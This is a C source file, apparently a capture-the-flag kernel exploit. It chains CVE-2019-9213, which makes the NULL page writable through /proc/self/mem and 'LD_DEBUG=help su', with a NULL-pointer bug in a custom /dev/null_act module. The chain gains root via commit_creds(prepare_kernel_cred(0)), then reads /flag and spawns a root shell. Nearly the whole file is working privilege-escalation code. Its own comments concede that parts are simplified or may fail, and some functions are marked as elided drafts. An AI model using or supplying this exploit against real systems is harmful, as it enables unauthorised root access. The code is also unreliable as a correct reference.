//burnsyore U202211867
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <sched.h> // For unshare

// IOCTL 命令号
#define NULL_ACT_ALLOC    0x40001
#define NULL_ACT_CALLBACK 0x40002
#define NULL_ACT_RESET    0x40004

const char *DEVICE_PATH = "/dev/null_act";
static int device_fd = -1;

/* ============================== Kernel Function Pointers ============================== */
// 再次强调：这些地址必须从你的目标内核的 /proc/kallsyms 或 System.map 中获取！
// 示例地址，请务必替换！
#define COMMIT_CREDS_ADDR         0xffffffff81084370UL // 替换为你的实际地址
#define PREPARE_KERNEL_CRED_ADDR  0xffffffff810845a0UL // 替换为你的实际地址

typedef int __attribute__((regparm(3))) (*_commit_creds_t)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred_t)(unsigned long cred);

_commit_creds_t commit_creds_ptr = (_commit_creds_t)COMMIT_CREDS_ADDR;
_prepare_kernel_cred_t prepare_kernel_cred_ptr = (_prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;

/* ============================== User State & Shell ============================== */
unsigned long user_cs, user_ss, user_rflags, user_sp;
void run_sh(void); // 前向声明
void check_privileges_and_shell(void); // 前向声明

void save_user_state(void) {
    asm volatile(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        : : "memory");
    printf("[+] User state saved: CS=0x%lx, SS=0x%lx, RSP=0x%lx, RFLAGS=0x%lx\n",
           user_cs, user_ss, user_sp, user_rflags);
}

/* ============================== Privilege Escalation Payload ============================== */
// 这个函数本身在用户空间，但其地址会被写入0x8，由内核调用
void get_root_privileges(void) {
    commit_creds_ptr(prepare_kernel_cred_ptr(0));

    asm volatile(
        "swapgs;\n"
        "movq %0, %%rsp;\n"
        "pushq %1;\n"
        "pushq %2;\n"
        "pushq %3;\n"
        "pushq %4;\n"
        "pushq %5;\n" // RIP: check_privileges_and_shell
        "iretq;\n"
        : : "r"(user_sp), "r"(user_ss), "r"(user_sp),
            "r"(user_rflags), "r"(user_cs), "r"((unsigned long)check_privileges_and_shell)
        : "memory");
}

/* ============================== CVE-2019-9213 Related ============================== */
// 利用 CVE-2019-9213 使地址0附近可写
// 这是一个简化的版本，实际利用可能需要更精细的控制或多次尝试
// Project Zero PoC 使用 LD_DEBUG 和 su 来触发写入，这里我们尝试直接 lseek + write
// 注意：直接 lseek + write 到地址 0 可能不会像预期的那样工作，
// 因为栈的向下增长和实际写入时机有关。
// 更可靠的方法是遵循 Project Zero 的 PoC 逻辑。
// 但为了演示核心思想，我们先尝试一个简化的直接写入。
// ... (其他代码和声明保持不变) ...

int map_zero_address_via_cve(void) {
    printf("[+] Attempting to make NULL page writable via CVE-2019-9213 (Project Zero PoC logic)...\n");

    // 1. mmap a region with MAP_GROWSDOWN
    void *map_start_addr = (void *)0x20000; // Start mapping higher up, e.g., 0x10000 or 0x20000
    size_t map_size = 0x1000;

    // unshare MIGHT help, but original PoC doesn't seem to require it for the core mechanism
    // if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0) {
    //     printf("[-] unshare failed, proceeding without it.\n");
    // }

    char *mapped_region = mmap(map_start_addr, map_size, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);

    if (mapped_region == MAP_FAILED || mapped_region != map_start_addr) {
        perror("[-] mmap with MAP_GROWSDOWN failed or not at fixed address");
        if (mapped_region != MAP_FAILED) munmap(mapped_region, map_size);
        return -1;
    }
    printf("[+] mmap with MAP_GROWSDOWN successful at %p.\n", mapped_region);

    // 2. Open /proc/self/mem
    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) {
        perror("[-] Failed to open /proc/self/mem");
        munmap(mapped_region, map_size);
        return -1;
    }
    printf("[+] /proc/self/mem opened (fd: %d).\n", mem_fd);

    // 3. Loop, trying to trigger the write to lower pages via LD_DEBUG=help su
    unsigned long current_lseek_addr = (unsigned long)map_start_addr;
    bool zero_page_potentially_writable = false;

    printf("[+] Starting loop to trigger writes via LD_DEBUG=help su...\n");
    while (current_lseek_addr > 0) { // Loop down to page 0x0
        current_lseek_addr -= 0x1000;
        printf("[*] Targeting address 0x%lx with lseek and LD_DEBUG write attempt.\n", current_lseek_addr);

        if (lseek(mem_fd, current_lseek_addr, SEEK_SET) < 0) {
            // If lseek to 0 fails, it might mean it's not yet mapped by the growing stack.
            // This is not necessarily an error for higher addresses if the stack hasn't reached them.
            // However, for addr 0, if lseek fails, it's a problem.
            if (current_lseek_addr == 0) {
                perror("[-] lseek to 0x0 in /proc/self/mem failed");
                // continue; // or break, depending on how strictly we follow the PoC
            } else {
                //perror("[-] lseek in /proc/self/mem failed (non-fatal for higher addresses)");
            }
            // Continue to try, as the stack might map it later.
        }

        char cmd[1000];
        sprintf(cmd, "LD_DEBUG=help su 1>&%d", mem_fd); // Redirect stderr of su to mem_fd
        // We might not want to see su's actual output to our terminal
        // strcat(cmd, " 2>/dev/null"); // Suppress su's actual stderr if it also goes to terminal
        
        // Using a subshell to better control su's environment and prevent it from messing with our parent
        // Also, `su` might require a terminal or ask for a password.
        // A non-interactive SUID binary might be better if `su` is problematic.
        // For now, let's assume `su` works non-interactively or `LD_DEBUG` output is enough.
        printf("[ CMD ] %s\n", cmd);
        int system_ret = system(cmd);
        if (system_ret != 0) {
            // printf("[-] system(\"%s\") returned %d. This might be okay if su tried to be interactive.\n", cmd, system_ret);
        }

        // After the system call, if current_lseek_addr was 0 and the bug was triggered,
        // address 0 might now be writable *through mem_fd*.
        if (current_lseek_addr == 0) {
            // Let's try to read from address 0 via mem_fd to see if it's mapped
            char test_byte;
            if (lseek(mem_fd, 0, SEEK_SET) == 0) {
                if (read(mem_fd, &test_byte, 1) == 1) {
                    printf("[+] Successfully read from address 0 via /proc/self/mem after LD_DEBUG attempt!\n");
                    zero_page_potentially_writable = true;
                    // break; // Found that page 0 is accessible, can stop the loop
                } else {
                    //perror("[-] read from 0 via /proc/self/mem failed after LD_DEBUG");
                }
            }
        }
    }

    if (!zero_page_potentially_writable) {
        // Fallback: Try one last time to lseek to 0 and see if it became readable/writable
        char test_byte;
        if (lseek(mem_fd, 0, SEEK_SET) == 0 && read(mem_fd, &test_byte, 1) == 1) {
            printf("[+] Fallback check: Address 0 is readable via /proc/self/mem.\n");
            zero_page_potentially_writable = true;
        } else {
            printf("[-] Address 0 does not seem to be readable/writable via /proc/self/mem after all attempts.\n");
            // close(mem_fd);
            // munmap(mapped_region, map_size); // Clean up mmap
            // return -1;
            // For this PoC, let's proceed and try to write anyway. The kernel will decide.
        }
    }


    // 4. Now that address 0 (or its page) is hopefully writable via mem_fd,
    //    write our payload (address of get_root_privileges) to 0x8.
    unsigned long payload_val = (unsigned long)get_root_privileges;
    off_t target_write_offset = 0x8;

    printf("[+] Attempting to write 0x%lx to address 0x%lx via /proc/self/mem...\n", payload_val, target_write_offset);
    if (lseek(mem_fd, target_write_offset, SEEK_SET) < 0) {
        perror("[-] lseek to 0x8 for final payload write failed");
        close(mem_fd);
        munmap(mapped_region, map_size);
        return -1;
    }
    if (write(mem_fd, &payload_val, sizeof(payload_val)) != sizeof(payload_val)) {
        perror("[-] write of payload to 0x8 failed");
        // Even if write fails, let's see if we can read it back to understand state
        unsigned long current_val_at_8 = 0;
        if (lseek(mem_fd, target_write_offset, SEEK_SET) == 0) {
            if (read(mem_fd, &current_val_at_8, sizeof(current_val_at_8)) == sizeof(current_val_at_8)) {
                 printf("[?] Value currently at 0x8 after failed write: 0x%lx\n", current_val_at_8);
            }
        }
        close(mem_fd);
        munmap(mapped_region, map_size);
        return -1; // If we can't write our payload, the exploit won't work
    }

    printf("[+] Successfully wrote payload to address 0x8.\n");
    // Verification
    unsigned long verify_val = 0;
    if (lseek(mem_fd, target_write_offset, SEEK_SET) == 0) {
        if (read(mem_fd, &verify_val, sizeof(verify_val)) == sizeof(verify_val) && verify_val == payload_val) {
            printf("[+] Verification successful: Value at 0x8 is 0x%lx.\n", verify_val);
        } else {
            printf("[-] Verification failed. Read back 0x%lx from 0x8, expected 0x%lx.\n", verify_val, payload_val);
            // This is a critical failure if verification fails.
        }
    } else {
        perror("[-] lseek for verification failed");
    }


    close(mem_fd);
    // Do NOT munmap mapped_region yet, as the modified page (page 0) needs to stay mapped
    // for the kernel to see our payload when the null_act_module dereferences it.
    // munmap(mapped_region, map_size); // Defer this or omit if process exits

    return 0; // Success in making 0x8 writable and writing payload
}

// ... (rest of your code: open_device, do_ioctl_op, get_root_privileges, run_sh, check_privileges_and_shell, main) ...
// Ensure all necessary forward declarations are present.


/* ============================== Device Interaction & Main ============================== */
int open_device() { /* ... same as previous ... */
    if (device_fd >= 0) return device_fd;
    device_fd = open(DEVICE_PATH, O_RDWR);
    if (device_fd < 0) {
        perror("[-] Failed to open /dev/null_act");
        return -1;
    }
    printf("[+] Device /dev/null_act opened (fd: %d).\n", device_fd);
    return device_fd;
}
void close_device() { /* ... same as previous ... */
    if (device_fd >= 0) { close(device_fd); device_fd = -1; }
}
int do_ioctl_op(unsigned int cmd, const char* cmd_name) { /* ... same as previous ... */
    if (device_fd < 0) { fprintf(stderr, "[-] Device not open for %s.\n", cmd_name); return -1; }
    printf("[+] Calling ioctl: %s (0x%x)\n", cmd_name, cmd);
    if (ioctl(device_fd, cmd, NULL) < 0) {
        char err_msg[100]; snprintf(err_msg, sizeof(err_msg), "[-] ioctl %s failed", cmd_name); perror(err_msg);
        return -1;
    }
    printf("[+] ioctl %s successful.\n", cmd_name);
    return 0;
}

void run_sh(void) { /* ... same as previous ... */
    printf("[+] In run_sh: UID: %d, EUID: %d\n", getuid(), geteuid());
    if (getuid() == 0) {
        printf("[+] Successfully got root privileges in run_sh!\n");
        printf("[+] Reading /flag...\n");
        FILE *f = fopen("/flag", "r");
        if (f) {
            char buf[256];
            while (fgets(buf, sizeof(buf), f)) { printf("%s", buf); }
            fclose(f);
            if (strchr(buf, '\n') == NULL) printf("\n");
        } else { perror("[-] Failed to open /flag"); }
        printf("[+] Spawning root shell...\n");
        char *args[] = {"/bin/sh", "-i", NULL};
        execve("/bin/sh", args, NULL);
        perror("[-] execve failed"); exit(EXIT_FAILURE);
    } else {
        fprintf(stderr, "[-] Failed to get root privileges in run_sh.\n");
        exit(EXIT_FAILURE);
    }
}

void check_privileges_and_shell(void) { /* ... same as previous ... */
    if (getuid() == 0) {
        printf("[+] SUCCESS: Returned to user-space with root (UID: %d, EUID: %d)!\n", getuid(), geteuid());
        run_sh();
    } else {
        fprintf(stderr, "[-] FAILURE: Returned to user-space but NO root (UID: %d, EUID: %d).\n", getuid(), geteuid());
        exit(EXIT_FAILURE);
    }
    exit(EXIT_SUCCESS);
}


int main(void) {
    int ret = EXIT_FAILURE;
    printf("[+] Starting exploit with CVE-2019-9213 for NULL page write...\n");

    save_user_state();

    // 1. Use CVE to map/write to zero address vicinity
    if (map_zero_address_via_cve() != 0) {
        fprintf(stderr, "[-] Failed to make NULL page writable via CVE. Aborting.\n");
        goto end;
    }
    // At this point, we hope that address 0x8 contains the address of get_root_privileges

    // 2. Interact with kernel module to trigger null pointer dereference
    if (open_device() < 0) {
        goto end;
    }
    if (do_ioctl_op(NULL_ACT_ALLOC, "NULL_ACT_ALLOC") != 0) {
        goto cleanup_device;
    }
    if (do_ioctl_op(NULL_ACT_RESET, "NULL_ACT_RESET") != 0) {
        goto cleanup_device;
    }

    printf("[+] Triggering kernel module vulnerability (expecting jump to 0x8 -> get_root_privileges)...\n");
    fflush(stdout);
    ioctl(device_fd, NULL_ACT_CALLBACK, NULL); // Kernel should jump to payload

    // Execution should be hijacked to get_root_privileges -> iretq -> check_privileges_and_shell
    // So, code here might not be reached, or its meaning changes.
    printf("[-] Main: After triggering callback. If seen, hijacked flow might have issues.\n");
    // We rely on the hijacked flow to call exit() or execve().

cleanup_device:
    close_device();
end:
    printf("[+] Exploit attempt finished.\n");
    // If we reach here without execve, something went wrong or it's a test run.
    return ret;
}
